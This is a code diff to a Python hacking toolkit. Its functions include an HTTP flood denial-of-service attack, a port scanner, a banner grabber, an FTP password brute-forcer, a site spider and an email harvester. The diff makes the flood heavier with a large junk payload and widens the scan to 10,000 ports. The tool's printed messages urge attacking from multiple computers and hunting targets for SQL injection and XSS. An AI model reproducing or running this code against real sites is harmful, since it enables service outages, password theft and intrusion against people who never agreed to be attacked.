@@ -11,8 +11,9 @@ from string import *
 import re
 import platform
 from pathlib import Path
-
-
+import requests
+from scapy.all import *
+import random
 user_agents = (
     "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
     "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
@@ -24,27 +25,19 @@ user_agents = (
 )
 
 
-operSys = platform.system()
 
 
-def clear_scr():
-    if operSys == "Windows":
-        call('cls', shell=True)
-    if operSys == "Linux":
-        call('clear', shell=True)
+
 
 
 def dos(host):
-    clear_scr()
-
-    print("[*]This program will use HTTP FLOOD to dos the host.\n[*]It would work only on small websites if done only for one computer.\n[*]To take down larger websites run the attack from multiple computers.\n[*] For better performance open multiple instances of this software and attack at the same time.\n")
+    print("\n[*]This program will use HTTP GET FLOOD and HTTP POST FLOOD to dos the host.\n[*]It would work only on small websites if done only for one computer.\n[*]To take down larger websites run the attack from multiple computers.\n[*] For better performance open multiple instances of this software and attack at the same time.\n")
     print("[*]Host to attack: "+host)
-    ip = socket.gethostbyname(host)
+    ip = socket.gethostbyname(hostname)
     print("[*]IP of the host: "+ip+"\n\n")
     conn = input(
         "Enter the number of packets to be sent(depends on the site but should be more than 2000 or 3000 for average sites): ")
     conn = int(conn)
-
     for i in range(conn):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -58,13 +51,14 @@ def dos(host):
             continue
         print("[*]FLOODING!")
         s.send("GET / HTTP/1.1\r\n".encode())
+        s.send(b"m"*60000)
         s.send("Host: ".encode()+host.encode()+"\r\n".encode())
         s.send("User-Agent: ".encode()+choice(user_agents).encode()+"\r\n\r\n".encode())
         s.close()
 
 
 def scanner(host):
-    clear_scr()
+    
 
     t1 = datetime.now()
     socket.setdefaulttimeout(2)
@@ -72,8 +66,7 @@ def scanner(host):
     print("[*] Starting Scanning at "+str(t1))
     host = socket.gethostbyname(host)
     print("[*] IP of host: "+host)
-    ports = [1, 5, 7, 18, 20, 21, 22, 23, 25, 43, 42, 53, 80, 109,
-             110, 115, 118, 443, 194, 161, 445, 156, 137, 139, 3306]
+    ports = list(range(1, 10001))
     try:
         for port in ports:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -96,7 +89,7 @@ def scanner(host):
 
 
 def banner(host):
-    clear_scr()
+    
 
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -130,7 +123,7 @@ def ask_file():
 
 
 def ftp(server):
-    clear_scr()
+    
 
     print("[*]Put the password file in the same directory.\n[*]The passwords should be on different lines.\n")
     passwords = ask_file().read_text().splitlines()
@@ -164,7 +157,7 @@ def ftp(server):
 
 
 def spider(host):
-    clear_scr()
+    
 
     print("[*] Use the result to find promising URLs/Emails to try hacking using SQL injection or Xss or Social Engineering etc.\n[*] Depth is the level to go inside the website( usually a small integer ).\n[*] Output will also be saved in text files in the same folder as this software.\n")
     depth = input("Enter the depth level in numbers: ")
@@ -198,7 +191,7 @@ def spider(host):
 
 
 def email(host):
-    clear_scr()
+    
 
     depth = spider(host)
     count = 1
@@ -238,6 +231,7 @@ def email(host):
 
 
 def ask_host():
+    global hostname
     hostname = input(
         "Enter hostname or IP address (google.com, www.yoursite.com, 192.168.1.1): ")
     if '://' in hostname:
